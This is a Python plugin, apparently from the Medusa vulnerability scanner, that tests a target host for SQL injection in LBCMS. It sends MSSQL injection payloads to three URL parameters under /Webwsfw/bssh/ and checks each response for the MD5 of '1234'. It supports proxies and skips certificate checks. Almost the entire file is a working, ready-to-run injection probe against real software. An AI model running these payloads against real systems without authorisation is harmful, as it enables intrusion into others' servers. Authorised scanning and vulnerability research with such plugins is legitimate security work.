#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: LBCMS多处SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0122653
author: Ascotbe
reference: Lucifer
description: 1、/Webwsfw/bssh/?green=1
             2、/Webwsfw/bssh/?object=11
             3、/Webwsfw/bssh/?subsite=1 都存在注入。
'''
import urllib
import requests


def UrlProcessing(url):
    if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/Webwsfw/bssh/?green=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
            "/Webwsfw/bssh/?object=11%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--",
            "/Webwsfw/bssh/?subsite=1%20AnD%20SyS.Fn_VarBintoHexstr(HashBytes(%27MD5%27,%271234%27))>0--"]

def medusa(Url, RandomAgent, ProxyIp):
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            # s = requests.session()
            if ProxyIp != None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp == None:
                resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055') != -1:
                Medusa = "{} 存在LBCMS多处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas